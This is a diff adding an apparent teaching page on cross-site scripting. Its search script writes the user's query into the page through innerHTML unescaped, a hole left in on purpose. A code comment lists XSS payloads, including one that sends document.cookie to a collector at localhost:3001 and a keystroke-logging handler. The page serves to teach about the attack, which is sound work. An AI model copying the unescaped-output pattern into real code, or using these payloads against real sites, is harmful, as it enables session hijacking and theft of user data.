@@ -1,0 +1,89 @@
+<html>
+<head>
+	<title>Cross-Site Scripting (XSS)</title>
+</head>
+<body>
+
+	<form action="">
+		<input type="text" name="q">
+		<input type="submit" value="Search">
+	</form>
+
+	<div id="results"></div>
+
+	<script>
+
+		/*
+			Proof of concept:
+			<img src="does-not-exist" onerror="alert(\'hi\')">
+
+			Alert session cookie:
+			<img src="does-not-exist" onerror="alert(document.cookie)">
+
+			Steal session cookie:
+			<img src="does-not-exist" onerror="var img = document.createElement(\'img\'); img.src = \'http://localhost:3001/cookie?cookie=\' + document.cookie; document.querySelector(\'body\').appendChild(img);">
+
+			Keylogger:
+			<img src="does-not-exist" onerror="document.querySelector(\'body\').addEventListener(\'keydown\', function(event) { console.log(event.key); });">
+		*/
+
+		document.addEventListener('DOMContentLoaded', function() {
+
+			var q = getQueryParameter('q');
+
+			if (q) {
+
+				search(q, function(error, results) {
+
+					showQueryAndResults(q, results);
+				});
+			}
+		});
+
+		function search(q, callback) {
+
+			var results = [
+				'Result #1',
+				'Result #2',
+				'Result #3'
+			];
+
+			callback(null, results);
+		}
+
+		function showQueryAndResults(q, results) {
+
+			var html = '';
+
+			html += '<p>Your search query:</p>';
+			html += '<pre>' + q + '</pre>';
+			html += '<ul>';
+
+			for (var i = 0; i < results.length; i++) {
+				html += '<li>' + results[i] + '</li>';
+			}
+
+			html += '</ul>';
+
+			var resultsEl = document.querySelector('#results');
+			resultsEl.innerHTML = html;
+		}
+
+		function getQueryParameter(name) {
+
+			var pairs = window.location.search.substring(1).split('&');
+
+			for (var i = 0; i < pairs.length; i++) {
+
+				var pair = pairs[i].split('=');
+
+				if (decodeURIComponent(pair[0]) === name) {
+					return decodeURIComponent(pair[1]);
+				}
+			}
+
+			return false;
+		}
+	</script>
+</body>
+</html>
